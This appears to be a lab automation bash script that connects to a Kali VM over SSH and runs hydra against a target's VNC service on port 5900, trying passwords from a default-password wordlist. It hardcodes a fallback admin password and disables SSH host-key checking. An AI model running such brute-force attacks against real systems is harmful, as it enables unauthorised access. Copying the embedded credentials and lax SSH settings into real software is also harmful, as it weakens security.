#!/usr/bin/env bash
# Run hydra on Kali VM 104 over SSH (from host with route to 192.168.60.150 or via Proxmox).
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
KALI_HOST="${KALI_HOST:-192.168.61.50}"
KALI_USER="${KALI_USER:-dadmin}"
KALI_PW="${KALI_PW:-${SECRETCON_SHARED_LOCAL_ADMIN_PASSWORD:-PizzaMan123!}}"
TARGET="${TARGET:-192.168.61.158}"
WORDLIST="${WORDLIST:-${REPO_ROOT}/tmp/vnc-better.txt}"

if [ ! -f "${WORDLIST}" ]; then
  WORDLIST="${REPO_ROOT}/provisioning/wordlists/vnc-betterdefaultpasslist.txt"
fi

SSHPASS_BIN="$(command -v sshpass)"
[ -n "${SSHPASS_BIN}" ] || { echo "[!] need sshpass" >&2; exit 1; }

REMOTE="set -e; ping -c1 -W2 ${TARGET} || sudo dhclient -v \$(ip -o link | awk '/36:1e:be/{print \$2}' | tr -d ':') 2>/dev/null || true
hydra -t 1 -V -f -P ${WORDLIST} -s 5900 ${TARGET} vnc"

echo "[*] ${KALI_USER}@${KALI_HOST} → hydra ${TARGET}:5900"
"${SSHPASS_BIN}" -p "${KALI_PW}" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=15 \
  -o PreferredAuthentications=password -o PubkeyAuthentication=no \
  "${KALI_USER}@${KALI_HOST}" "${REMOTE}"
